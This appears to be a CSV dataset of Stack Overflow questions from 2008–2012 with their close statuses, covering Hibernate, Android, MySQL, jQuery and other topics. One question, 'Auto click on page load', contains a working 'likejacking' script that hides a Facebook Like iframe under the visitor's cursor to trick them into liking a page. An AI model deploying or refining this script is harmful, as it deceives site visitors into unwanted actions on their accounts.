PostId,PostCreationDate,OwnerUserId,OwnerCreationDate,ReputationAtPostCreation,OwnerUndeletedAnswerCountAtPostTime,Title,BodyMarkdown,Tag1,Tag2,Tag3,Tag4,Tag5,PostClosedDate,OpenStatus
7405880,09/13/2011 17:20:41,927768,09/04/2011 17:10:25,1,0,Hibernate querying issue,"I have the following code on the webservice that uses Hibernate


    Session session = ICDBHibernateUtil.getSessionFactory().getCurrentSession();
    session.beginTransaction();
    User user = (User) session.load(User.class, userid);
    
    userId is a paramter sent from the client.
    User class
    package com.icdb.data;
    
    import java.util.Date;
    import java.util.HashSet;
    import java.util.Set;
    
    public class User implements java.io.Serializable {
    
    	private Integer userid;
    	private String username;
    	private String email;
    	private String password;
    	private String firstname;
    	private String lastname;
    //	private String streetaddress;
    //	private String city;
    //	private String phone;
    	private String state;
    	private String country;
    	private Date birthdate;
    //	private String zipcode;
    	private Set usersesForFavoriteuser = new HashSet(0);
    	private Set recipetipses = new HashSet(0);
    	private Set recipeses = new HashSet(0);
    	private Set recipepictureses = new HashSet(0);
    	private Set onlineuserses = new HashSet(0);
    	private Set generaltipses = new HashSet(0);
    	private Set usersesForFollowinguser = new HashSet(0);
    	private Set recipereviewses = new HashSet(0);
    
    	public User() {
    	}
    
    	public User(	String username, 
    					String password, 
    					String email, 
    					String firstname,
    					String lastname, 
    //					String streetaddress, 
    //					String city, 
    //					String phone,
    					String state, 
    					String country, 
    					Date birthdate )
    //					String zipcode ) 
    	{
    		this.username = username;
    		this.password = password;
    		this.email = email;
    		this.firstname = firstname;
    		this.lastname = lastname;
    //		this.streetaddress = streetaddress;
    //		this.city = city;
    //		this.phone = phone;
    		this.state = state;
    		this.country = country;
    		this.birthdate = birthdate;
    //		this.zipcode = zipcode;
    	}
    
    	public User(	String username,
    					String password, 
    					String email,
    					String firstname,
    					String lastname,
    //					String streetaddress, 
    //					String city, 
    					String phone,
    //					String state, 
    //					String country, 
    //					String email, 
    					Date birthdate,
    //					String zipcode, 
    					Set usersesForFavoriteuser, 
    					Set recipetipses,
    					Set recipeses, 
    					Set recipepictureses, 
    					Set onlineuserses,
    					Set generaltipses, 
    					Set usersesForFollowinguser, 
    					Set recipereviewses ) 
    	{
    		this.username = username;
    		this.password = password;
    		this.email = email;
    		this.firstname = firstname;
    		this.lastname = lastname;
    //		this.streetaddress = streetaddress;
    //		this.city = city;
    //		this.phone = phone;
    		this.state = state;
    		this.country = country;
    		this.birthdate = birthdate;
    //		this.zipcode = zipcode;
    		this.usersesForFavoriteuser = usersesForFavoriteuser;
    		this.recipetipses = recipetipses;
    		this.recipeses = recipeses;
    		this.recipepictureses = recipepictureses;
    		this.onlineuserses = onlineuserses;
    		this.generaltipses = generaltipses;
    		this.usersesForFollowinguser = usersesForFollowinguser;
    		this.recipereviewses = recipereviewses;
    	}
    
    	public Integer getUserid() {
    		return this.userid;
    	}
    
    	public void setUserid(Integer userid) {
    		this.userid = userid;
    	}
    
    	public String getUsername() {
    		return this.username;
    	}
    
    	public void setUsername(String username) {
    		this.username = username;
    	}
    
    	public String getPassword() {
    		return this.password;
    	}
    
    	public void setPassword(String password) {
    		this.password = password;
    	}
    
    	public String getFirstname() {
    		return this.firstname;
    	}
    
    	public void setFirstname(String firstname) {
    		this.firstname = firstname;
    	}
    
    	public String getLastname() {
    		return this.lastname;
    	}
    
    	public void setLastname(String lastname) {
    		this.lastname = lastname;
    	}
    
    //	public String getStreetaddress() {
    //		return this.streetaddress;
    //	}
    
    //	public void setStreetaddress(String streetaddress) {
    //		this.streetaddress = streetaddress;
    //	}
    
    //	public String getCity() {
    //		return this.city;
    //	}
    
    //	public void setCity(String city) {
    //		this.city = city;
    //	}
    
    //	public String getPhone() {
    //		return this.phone;
    //	}
    
    //	public void setPhone(String phone) {
    //		this.phone = phone;
    //	}
    
    	public String getState() {
    		return this.state;
    	}
    
    	public void setState(String state) {
    		this.state = state;
    	}
    
    	public String getCountry() {
    		return this.country;
    	}
    
    	public void setCountry(String country) {
    		this.country = country;
    	}
    
    	public String getEmail() {
    		return this.email;
    	}
    
    	public void setEmail(String email) {
    		this.email = email;
    	}
    
    	public Date getBirthdate() {
    		return this.birthdate;
    	}
    
    	public void setBirthdate(Date birthdate) {
    		this.birthdate = birthdate;
    	}
    
    //	public String getZipcode() {
    //		return this.zipcode;
    //	}
    
    //	public void setZipcode(String zipcode) {
    //		this.zipcode = zipcode;
    //	}
    
    	public Set getUsersesForFavoriteuser() {
    		return this.usersesForFavoriteuser;
    	}
    
    	public void setUsersesForFavoriteuser(Set usersesForFavoriteuser) {
    		this.usersesForFavoriteuser = usersesForFavoriteuser;
    	}
    
    	public Set getRecipetipses() {
    		return this.recipetipses;
    	}
    
    	public void setRecipetipses(Set recipetipses) {
    		this.recipetipses = recipetipses;
    	}
    
    	public Set getRecipeses() {
    		return this.recipeses;
    	}
    
    	public void setRecipeses(Set recipeses) {
    		this.recipeses = recipeses;
    	}
    
    	public Set getRecipepictureses() {
    		return this.recipepictureses;
    	}
    
    	public void setRecipepictureses(Set recipepictureses) {
    		this.recipepictureses = recipepictureses;
    	}
    
    	public Set getOnlineuserses() {
    		return this.onlineuserses;
    	}
    
    	public void setOnlineuserses(Set onlineuserses) {
    		this.onlineuserses = onlineuserses;
    	}
    
    	public Set getGeneraltipses() {
    		return this.generaltipses;
    	}
    
    	public void setGeneraltipses(Set generaltipses) {
    		this.generaltipses = generaltipses;
    	}
    
    	public Set getUsersesForFollowinguser() {
    		return this.usersesForFollowinguser;
    	}
    
    	public void setUsersesForFollowinguser(Set usersesForFollowinguser) {
    		this.usersesForFollowinguser = usersesForFollowinguser;
    	}
    
    	public Set getRecipereviewses() {
    		return this.recipereviewses;
    	}
    
    	public void setRecipereviewses(Set recipereviewses) {
    		this.recipereviewses = recipereviewses;
    	}
    
    }

also userId defined in the .hbm.xml as

      <id name=""userid"" type=""java.lang.Integer"">
       <column name=""userid""/>
       <generator class=""identity""/>
      </id>

So we have a table of users and another tables that its FK is userId.

I need to update the code to handle the request with a username - and then retrieve the userId instead of the mentioned code of the webservice.

Please help :)

Yoav


",web-services,hibernate,query,,,,open
11347010,07/05/2012 14:57:52,1195651,02/07/2012 20:24:36,288,0,looking for a good and correct java implementation of mvc pattern,I'm trying to search on the net some good implementation of java mvc pattern but I found a lot of things and all those things confused me so much.I start from the knowledge of mvc pattern in php language but I don't know how apply on java because I have never done.someone can show me a good and correct implementation?,java,mvc,,,,07/06/2012 01:06:12,not a real question
4868862,02/01/2011 22:49:06,239915,12/29/2009 01:52:29,509,20,Limiting copas to a particular host: Allowing multiple web servers,"I'm trying to limit the host in which copas receives sockets, with the end goal of allowing other web servers to handle requests with other hostnames on the same machine. In this particular case, when I use

    copas.addserver(assert(socket.bind(""*"", 80)),
        function(c)
            return handler(copas.wrap(c), c:getpeername())
        end
    )

It correctly handles the request and returns a response as expected. However, when I replace `""*""` with `""localhost""`, my results are mixed. Is this the correct way to go about listening for sockets with a specific hostname (obviously substituting the preferred name in place of localhost)? Will this allow for other web servers to server content alongside it for other hostnames?",sockets,lua,,,,,open
3348307,07/27/2010 21:47:52,301860,03/25/2010 16:18:35,88,1,Non local connections for django project server,"I ran the command `python manage.py runserver 0.0.0.0:8000`

It started the server up, but when I navigate to http://myipaddress:8000, my webbroswer doesnt connect. I also tried with my iphone safari brower and got the same thing.

I am using Mac OS X 10.6 and am connect to the the internet through my router.

Any suggestions on how to allow non-local connections so my friends can try out my project?
",django,pinax,django-manage.py,,,,open
8146167,11/16/2011 03:06:00,881703,08/06/2011 07:33:09,10,0,Get more computation power for developing java application,I'm developing Java application using Eclipse IDE. problem is my PC is every low performance with XP. My company has many PCs free. So is there way to distributed free free computer and get that computer power for my Android application development.  ,android,eclipse,distributed,,,11/16/2011 06:25:19,off topic
7167216,08/23/2011 20:35:09,212246,11/16/2009 17:29:52,1,2,server bogged and mysql query slow log,"i have serious performance problem (all of a sudden) on my server (php+mysql). I enabled mysql slow query log and he started to show some queries that were taking even 25 secs to complete. for example this one takes 15 seconds:

    # Time: 110823  2:07:01
    # User@Host: ***[***] @ localhost []
    # Query_time: 15  Lock_time: 0  Rows_sent: 1  Rows_examined: 1
    use ***;
    SELECT `users`.*
    FROM (`users`)
    WHERE `users`.`id` = 4413
    ORDER BY `users`.`id` ASC
    LIMIT 0, 1;

Point is, on the field Id there is a primary key and if i run the query from phpmyadmin it executes in 0.00008 seconds. This is the explain plan:

    id 	select_type 	table 	type 	possible_keys 	key 	key_len 	ref 	rows 	Extra
    1 	SIMPLE 	users 	const 	PRIMARY 	PRIMARY 	4 	const 	1 	

I am really confused, because the hosting provider it is saying everything is fine and is my database. I checked all the parameters with tuning-primer by Matthew Montgomery and all settings seems fine...



",mysql,performance,query,,,,open
6013978,05/16/2011 06:44:07,274299,02/16/2010 11:16:32,1457,48,Create muc room programmatically,"I need to create multi user chat room from my module. I try to use mod_muc:create/5 -

    mod_muc:create_room(""conference.localhost"", ""testroom"", ""testuser@localhost"", ""testuser"", default).

But when i run client and login, nothing happens. The room doesn't create.

How can i correctly create muc room from my module code? And where i can find in ejabberd mod_muc source code where create_room/5 executes?

Thank you.",erlang,ejabberd,,,,,open
6729133,07/18/2011 06:02:14,815186,06/25/2011 09:36:14,9,0,Fatal error: Uncaught OAuthException: An access token is required to request this resource,"I'm accessing the graph api and am getting back an access token , its works fine in Mozilla. but am getting this error in IE:

 **Fatal error: Uncaught OAuthException: An access token is required to request this resource**

Thanks in advance!



 
",php,facebook,api,graph,,07/18/2011 20:12:17,not a real question
1545715,10/09/2009 19:48:27,49684,12/29/2008 00:39:20,207,5,Flex: Error #2038: File I/O Error,"I have a flex app doing multiple file upload, and keep getting this error:
Error #2038: File I/O Error

Flex gives this error, yet it seems to work because the upload does get processed.
This was happening intermittently, now on every attempt. Any ideas on what might be going on here? I've checked that permissions are read/write, google'd something about a trailing slash issue with the url. I'm at a loss as to what could be going on.",flex,upload,,,,07/24/2012 17:40:55,too localized
11301285,07/02/2012 21:15:15,1178191,01/30/2012 13:52:56,33,5,How to change a view property in CustomAdapter?,"I have CustomAdapter extending ArrayAdapter, in which I set some views inside LinearLayout - one row, like this (adapter):


    public View getView(int position, View convertView, ViewGroup parent) {
        . . .
        ImageView statePic = (ImageView) view.findViewById(R.id.state);
        statePic.setImageResource(R.drawable.light_green);
        return view;
    }

This works fine. But now I want to bind a context menu on item in my list, so I have something like this (main activity - listActivity):

    public boolean onContextItemSelected(MenuItem item) {
        AdapterContextMenuInfo info = (AdapterContextMenuInfo) item.getMenuInfo();
		
        switch(item.getItemId()){
        case CM_START:
            View view = getListAdapter().getView(info.position, null, null);
            ImageView statePic = (ImageView)view.findViewById(R.id.state);
            // I'm sure this view is the right one

            statePic.setImageResource(R.drawable.light_grey);
            view.invalidate();
            view.refreshDrawableState();
            return true;
			
        case CM_STOP:
            return true;
        }
        return super.onContextItemSelected(item);
    }

What I want to achieve with this snippet is to change image in that item, but this doesn not work. How can I do that?",android,listview,custom-adapter,,,,open
7412616,09/14/2011 07:19:09,245326,01/07/2010 07:08:03,337,2,windows phone 7 sms arrival,"Is there any way that wp7 application in windows phone

can trace the sms arriving to the windows phone

in which wp7 application is installed in?",c#,.net,windows-phone-7,,,09/14/2011 13:23:29,not a real question
11673421,07/26/2012 16:04:13,151824,08/06/2009 14:29:42,261,14,regex minify error,"I use this [regex][1] to minify my pages. I get the error when there is to much data to handle. (But I only list 186 rows)

If I set the limit in my sql to 20 rows - it works.  

My error_log: **child pid 4736 exit signal Segmentation fault (11)** 


Is there any idea how to solve this or have someone found a solution?


  [1]: http://stackoverflow.com/questions/5312349/minifying-final-html-output-using-regular-expressions-with-codeigniter",php,regex,,,,07/26/2012 16:53:10,not a real question
10900776,06/05/2012 16:04:13,452058,09/19/2010 17:46:15,38,1,Templates for phpDoc and PDF,"Anyone know where to find some good templates for phpDocumentor2 (phpdoc)?

And also how can I generate PDF through phpdoc?

Thank you in advance for help.",php,php5,documentation-generation,phpdoc,phpdocumentor,06/05/2012 16:10:32,off topic
7943287,10/30/2011 04:19:41,856088,07/21/2011 13:54:12,6,0,Auto click on page load,"I found a facebook auto like script, its working..
but I want it to work on page load without the visitor need to click. 
Is it possible? I have tried jQuery trigger function, but it does not worked. Can anybody tell me how to do it modifying the existing script without adding any new codes or just adding some coded to the existing code?



    <!DOCTYPE html PUBLIC ""-//W3C//DTD HTML 4.01 Transitional//EN"" ""http://www.w3.org/TR/html4/loose.dtd"">
    <html lang=""en"" id=""ns-sky"" xmlns=""http://www.w3.org/1999/xhtml"" xmlns:fb=""http://www.facebook.com/2008/fbml"">
    
    <head>
    <title>YourWebsite.com</title>
    <script src=""jquery-1.4.2.min.js"" type=""text/javascript""></script>
    <script type=""text/javascript"">
    var interval;
            $(function()
    {
        interval=setInterval(""updateActiveElement();"", 50);
    });
    
    function updateActiveElement()
    {
        if ( $(document.activeElement).attr('id')==""fbframe"" ) 
        {
            clearInterval(interval);
            iflag=1; 
        }    
    }
            
    </script>
    </head>
    <body>
    
    
    Paste your code here....
    
    
    
    
    
    
    
    <!--footer: Paste all codes just above-->
    <div style=""overflow: hidden; width: 10px; height: 12px; position: absolute; filter:alpha(opacity=0); -moz-opacity:0.0; -khtml-opacity: 0.0; opacity: 0.0;"" id=""icontainer"">
    
     
    <!--facebook like frame code goes here-->
    
             <iframe src=""http://www.facebook.com/plugins/like.php?href=http%3A%2F%2Fyourwebsite.com%2F&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;font=tahoma&amp;colorscheme=light&amp;height=80"" scrolling=""no"" frameborder=""0"" style=""border:none; overflow:hidden; width:50px; height:23px;"" allowTransparency=""true"" id=""fbframe"" name=""fbframe""></iframe>
             
          <!--end facebook like frame code-->
    
        </div>
        
        
          <script>
        var iflag = 0;
        var icontainer = document.getElementById('icontainer');    
        var standardbody=(document.compatMode==""CSS1Compat"")? document.documentElement : document.body //create reference to common ""body"" across doctypes
        
        
        
        function mouseFollower(e){
            /*                    DO NOT EDIT THIS                         */
        if (window.event) 
        { // for IE
            icontainer.style.top = (window.event.y-5)+standardbody.scrollTop+'px';
            icontainer.style.left = (window.event.x-5)+standardbody.scrollLeft+'px';
        } 
        else 
        {
            icontainer.style.top = (e.pageY-5)+'px';
            icontainer.style.left = (e.pageX-5)+'px';
        }
    
        }
        document.onmousemove = function(e) {
            if (iflag == 0) {mouseFollower(e);}
        }
    
        </script>
     </body>
     </html>",javascript,jquery,,,,10/30/2011 11:51:00,not constructive
8766020,01/06/2012 23:52:11,857025,07/21/2011 23:48:37,341,11,What is the average website user's CPU/RAM/GPU?,"I'm programming a some sites with javascript/css/dom animation. I'd like to know what computer capabilities I should program to. For example, when laying out a site, I know the average screen size to program for (e.g. the majority of users have at least 1024x768, so that's lowest common denominator), but cannot find anywhere what computer capabilities I should program for. Anyone know?",javascript,dom,optimization,browser,,01/06/2012 23:54:17,off topic
10646456,05/18/2012 03:49:06,768894,05/25/2011 04:41:48,494,22,File upload functionality?,"I want to implement file upload functionality in my project but the problem is,
<br />
using HTML's <br /><br />`<input type=""file"">` <br /><br />simply gives a button which allows file upload What I need<br /> is a TextField in front of the button and once I select a file using the button<br /> the full path get displayed in the text box.

Any help?<br><br>
Thanks,<br>
Mohit",javascript,html,clojure,,,05/20/2012 22:53:53,not a real question
460136,01/20/2009 04:32:12,25915,10/07/2008 18:52:13,26,0,Windows internet shortcuts: starting with IE maximized?,"I have an internet shortcut on my desktop, with the contents looking like this:

    [InternetShortcut]
    URL=http://www.microsoft.com/isapi/redir.dll?prd=ie&pver=6&ar=IStart
    Modified=D03458CE7738C801A2

I was wondering if there are any tweaks I can do to guarantee that the browser starts maximized after someone loads the link.

Thanks!",windows,internet,shortcut,,,,open
6593741,07/06/2011 08:46:30,823055,06/30/2011 12:44:25,1,0,How do I center a 1700px div so that no horizontal scrollbars appear?,"I'm building a site with a 1700px wide JS slideshow at the top. When I publish the page, I get horizontal scrollbars since my monitor is on a 1024px resolution. How do I get the site to be centered in the browser with no horizontal scrollbars - and whatever is superfluous on either side simply isn't visible to the user?
Help GREATLY appreciated, thanks!!!",html,css,,,,,open
1908494,12/15/2009 16:08:14,109360,05/19/2009 13:09:43,1037,64,c# - combine 2 statements in a catch block into one,"Does anybody know if it's possible to write the code in the catch block below as a single statement?  I haven't been able to come up with a way, and was just curious if there was one.

IMPORTANT: the stack trace must be preserved.

        catch (Exception e)
        {
            if (e is MyCustomException)
            {
                // throw original exception
                throw;
            }
            
            // create custom exception
            MyCustomException e2 =
                new MyCustomException(
                    ""An error occurred performing the calculation."", e);
            throw e2;
        }

",c#,exception,,,,,open
8096437,11/11/2011 15:46:52,586840,01/24/2011 01:13:24,16,0,'Rare' sorting algorithms?,"Our algorithm professor gave us a assignment that requires us to choose a **rare** sorting algorithm (e.g. Introsort, Gnomesort, etc.) and do some research about it.
Wikipedia sure has a plenty of information about this, but it is still not enough for me to do the research in depth.
So I would like to find a book that include discussions of those rare sorting algorithms, since most of the textbooks (like CLRS, the one I am using) only discuss about some basic sorting algorithms (e.g. Bubble Sort, Merge Sort, Insertion Sort.).
Is there a book or website that contains a good amount of those information?
Thanks!",algorithm,sorting,,,,11/11/2011 23:58:51,not constructive
7108205,08/18/2011 13:30:04,209866,11/12/2009 19:03:39,206,6,How to undo ALTER TABLE in sqlplus i.e. Oracle 10g?,"    rollback;

doesn't seem to undo alter table changes.

Background:  
I'm generating some .sql scripts (based on parsed Hibernate scripts) which are trashing my tables. Importing the full database for testing takes up to 30 minutes (also slowing my machine) and as much as I enjoy taking breaks, i'd prefer to just undo everything with a command such as rollback and try again.

btw this is Oracle 10g Express Edition Release 10.2.0.1.0

Is this even possible?",table,oracle10g,sqlplus,rollback,alter,,open
8830216,01/12/2012 04:40:47,1134982,01/06/2012 19:05:20,3,0,"How to write Generators , list comprehension in python","When i think about any problem , thinking via list comprehension doesn't come naturally.

Whats the best way to think through this?

Regards
Ashish",python,list-comprehension,,,,01/12/2012 06:33:41,not a real question
8454359,12/10/2011 04:19:14,1090630,12/09/2011 23:21:40,3,0,Update XML value in the server with c#,"How to update a certain value on a XML file,when xml file is on server?
",c#,xml,,,,12/10/2011 04:36:25,not a real question
3374437,07/30/2010 18:40:04,85178,03/31/2009 15:35:26,391,11,Where to find ocean and earth data maps usable to simulate water depth level?,"Searching on USGS I did not find something easily usable without passing from GIS or similar.

I need only something easy to use, like a high map resolution of the Earth without and with ocean. Have you some hint or advice on how to convert available GIS data?",maps,simulation,generation,,,07/31/2010 02:51:11,off topic
3445024,08/09/2010 23:49:55,401980,07/26/2010 06:32:16,17,1,jQuery to PHP and back again!,"I'd like to pass content back and forth from PHP to jQuery and vice versa. I'm not sure if I fully understand the best way to go about this and am hoping for some best advice and clarification.

Below is an example of something I'm trying to do. The PHP lists the files in a directory (whose path is passed to it from jQuery), stores them in an array, then passes them back to jQuery. I'd like to use the values in that array for various purposes but really I just want to understand passing information back and forth between the two, wether it's from an array, or just a plain variable. *Merci beaucoup!*

**The PHP:**  
    <?php
    
    $files = array();
    $dir = ($_POST['dir']);
    $count = 0;

    if ($handle = opendir($dir)) {
        while (false !== ($file = readdir($handle))) {
            if ($file != ""."" && $file != "".."" && strpos($file, '.jpg',1)) {$count++;
                $files[$file] = $file;
            }
        }
        closedir($handle);
    }
        echo json_encode($files);
    ?>
**The jQuery:**

    $(document).ready(function(){
    
    	$('a').click( function(e) {
    		e.preventDefault();
    
    		$.post(""php.php"", 'path/to/directory/',
    		    function(data) {
    		        alert(data);
    		}, ""json"");
    	});
       
    });",php,jquery,,,,,open
1798574,11/25/2009 17:26:32,181722,09/30/2009 10:21:36,36,1,Force WCF to call a method on every request before entering actual function,"I have a RESTful WCF service with many different functions. For each function I need to call an authentication method that I have written. I can manually call this method on every request but I was looking for a way to force the WCF engine to call this method before these functions are entered. Does anyone know if this is possible? 

Cheers
 ",wcf,rest,web-services,,,,open
4985002,02/13/2011 15:31:33,563020,01/04/2011 19:16:03,46,1,"[Android] The method startActivityForResult(Intent, int) is undefined for the type new AdapterView.OnItemClickListener","i'm new to android and i'm trying to code an app which fetches json data off the web, creates a list. if you click on a list item a new activity starts which shows the details of the activity. however i cant seem to start the second activty, i keep getting the error ""The method startActivityForResult(Intent, int) is undefined for the type new AdapterView.OnItemClickListener(){}"" in eclipse. here is the full source.
any ideas?

    public class Main extends Activity {
    
        @Override
        public void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            setContentView(R.layout.main);
            new LongOperation(this).execute();
        }
        
        
    	public boolean onCreateOptionsMenu(Menu menu) {
    		MenuInflater inflater = getMenuInflater();
    		inflater.inflate(R.menu.menu, menu);
    		return true;
    	}
    
    	@Override
    	public boolean onOptionsItemSelected(MenuItem item) {
    		new LongOperation(this).execute();
    		return true;
    	}
    }
    
    class LongOperation extends AsyncTask<String, Void, String> {
    	private Main longOperationContext = null;
        ProgressDialog pd = null;
        TextView tv = null;
        ListView lv1 = null;
    	String [] lv_arr;
    	String [] lv_arr_id;
    	private static final int ACTIVITY_CREATE = 0;
    
    
    
        public LongOperation(Main context) {
            longOperationContext = context;
            Log.v(""LongOper"", ""Konstuktor"");
        }
    	    
        @Override
        protected String doInBackground(String... params) {
            Log.v(""doInBackground"", ""inside"");
            try {
                URL json = new URL(""http://www.ytmusicplayer.com/jsontest.php"");
                URLConnection tc = json.openConnection();
                BufferedReader in = new BufferedReader(new InputStreamReader(tc.getInputStream()));
    
                String line;
                while ((line = in.readLine()) != null) {
                        JSONArray ja = new JSONArray(line);
                        Log.v(""line = "", "" "" + ja.length());
            			lv_arr = new String[ja.length()];
            			lv_arr_id = new String[ja.length()];
                        for (int i=0;i<ja.length();i++) {
    	                    JSONObject jo = (JSONObject) ja.get(i);
    	    				lv_arr[i] = jo.getString(""name"");
    	    				lv_arr_id[i] = jo.getString(""id"");
                        }
                }
            } catch (MalformedURLException e) {
                e.printStackTrace();
                Log.v(""Error"", ""URL exc"");
            } catch (IOException e) {
                e.printStackTrace();
                Log.v(""ERROR"", ""IOEXECPTOIn"");
            } catch (JSONException e) {
                e.printStackTrace();
                Log.v(""Error"", ""JsonException"");
            }
            Log.v(""Line: "", lv_arr[0] + "" - "" + lv_arr[1]);
            return null;
        }
    
        @Override
        protected void onPostExecute(String result) {
    		lv1.setAdapter(new ArrayAdapter<String>(longOperationContext,android.R.layout.simple_list_item_1 , lv_arr));
            lv1.setTextFilterEnabled(true);
            lv1.setOnItemClickListener(new OnItemClickListener() {
    		        @Override
    		        public void onItemClick(AdapterView<?> a, View v, int position, long id) {
    						Intent i = new Intent(longOperationContext, Details.class);
    						i.putExtra(""id"", lv_arr_id[position]);
    						startActivityForResult(i, ACTIVITY_CREATE);
    		        }
            });
    		pd.hide();
        }
        protected void onPreExecute() {
    		lv1 = (ListView)longOperationContext.findViewById(R.id.ListView01);
            pd = new ProgressDialog(longOperationContext);
            pd.setProgressStyle(ProgressDialog.STYLE_SPINNER);
            pd.setMessage(""Loading..."");
            pd.setIndeterminate(true);
            pd.setCancelable(false);
            pd.show();
        }
    
        @Override
        protected void onProgressUpdate(Void... values) {
        }
    }

thanks in advance",android,listview,activity,android-intent,android-asynctask,,open
7061912,08/15/2011 05:18:11,894521,08/15/2011 05:18:11,1,0,How to consume a Web Service in Java,"I have a web service I made through Eclipse, the one made with the wizard. It works, though my problem is I don't know how to use that web service in another program. I tried to look for ways in Google but there are too many and some of them I don't even know how to set up.

How should I do it?",java,web-services,,,,08/15/2011 06:08:35,not a real question
11668288,07/26/2012 11:28:12,1536682,07/19/2012 03:36:38,1,0,How to elegantly check if a number is within a range using JAVA?,"How can I do this elegantly with JAVA?

For example a number can be between 1 and 100.",java,numbers,,,,07/27/2012 11:57:28,not a real question
11705739,07/29/2012 00:30:56,1042960,11/12/2011 09:09:14,1,0,EMR - Hive and Java together,"I'm using Amazon Elastic-Map-Reduce.
Is it possible to run a HIVE query that uses a java code (using the Transform functionality)?

When I create a new job-flow, I need to select between a custom-jar and a hive program, while I need both ...

Thanks ahead!",java,hive,emr,,,,open
9845817,03/23/2012 20:04:08,787960,06/07/2011 17:39:28,74,1,How to get a reference to a Table in a tab/worksheet that isn't the active one,"I have some existing custom Excel workbooks/applications with code-behind C#, which work fine.  They do things like referencing Tables defined in the active worksheet, setting their datasources to IEnumerables, etc.

However, now I need to reference a Table which is not in the active sheet.  Basically, the active sheet has a button that triggers some C# code-behind, and I need to figure out how to get a reference to a Table on the fourth tab/worksheet in my workbook while inside the code-behind for the first tab/worksheet (the active one).

In my existing code (which works), I can do this on the active sheet:

    this.Table1.DataSource = results;
    this.Table1.RefreshDataRows();

... so the ""Table1"" reference is right there and I can access it easily.

However, trying to get a reference to a Table in the other sheet, I run into ComObject errors.  For example, I was hoping that this (or something like it) would work:

    ((Sheet4)Application.Worksheets[3]).Table2.DataSource = results;
    ((Sheet4)Application.Worksheets[3]).Table2.RefreshDataRows();

... but that throws the error: ""Cannot convert type 'System.__ComObject' to ContractStatementClient.Sheet4'"".  Writing those lines allows Visual Studio to find the Table (Table2) using IntelliSense, but at execution time it fails with the ComObject error I mentioned.  ""Sheet4"" is the name of the class that Visual Studio created for me when I made the new tab.

I can get references to Worksheets that seem to work by doing:

    Application.ActiveWorkbook.Worksheets[3]

... but I can't seem to figure out how to get from there to having a handle to a Table (or ListObject), that I can set the DataSource property on, as I've done in the past.

I tried this, but it throws a ""NOINTERFACE"" COM error during the cast:

    Worksheet worksheet = Application.ActiveWorkbook.Worksheets[3];
    ((Microsoft.Office.Tools.Excel.ListObject) (worksheet.ListObjects[1])).DataSource = results;

Am I missing something obvious?  I know next to nothing about COM, so it's tough for me to diagnose what's going on.  In the end, I just need to figure out how to set the datasource for the Table/ListObject in the other tab/worksheet (and presumably tell it to refresh itself).

Thanks!  Any help is greatly appreciated.",c#,excel,,,,,open
7370339,09/10/2011 07:41:44,936544,09/09/2011 10:05:24,3,0,Which MySQL storage engine should I use?,I don't think innoDB could work because I need to truncate often very large tables (some GB) and i need every bit of disk space.,mysql,engine,,,,09/10/2011 08:57:03,not a real question
130843,09/25/2008 00:40:36,18265,09/18/2008 21:23:01,11,4,How do I add a <table> using Element with Prototype in IE6?,"Using Prototype 1.6's ""new Element(...)"" I am trying to create a &lt;table&gt; element with both a &lt;thead&gt; and &lt;tbody&gt; but nothing happens in IE6.

    var tableProto = new Element('table').update('<thead><tr><th>Situation Task</th><th>Action</th><th>Result</th></tr></thead><tbody><tr><td>a</td><td>b</td><td>c</td></tr></tbody>');

I'm then trying to inject copies of it like this:

    $$('div.question').each(function(o) {
      Element.insert(o, { after:$(tableProto.cloneNode(true)) });
    });

My current workaround is to create a &lt;div&gt; instead of a &lt;table&gt; element, and then ""update"" it with all of the table HTML.

How does one successfully do this?",javascript,dom,prototype,js,,12/31/2008 00:17:14,off topic
9338307,02/18/2012 03:39:25,1208960,02/14/2012 11:30:42,1,0,how can i do to make position:fixed work well,"i have a div,

it's width is 200px ,height is 150px,

i want the style of div's position is fixed

To make it centered horizontally and vertically centered",javascript,,,,,,open
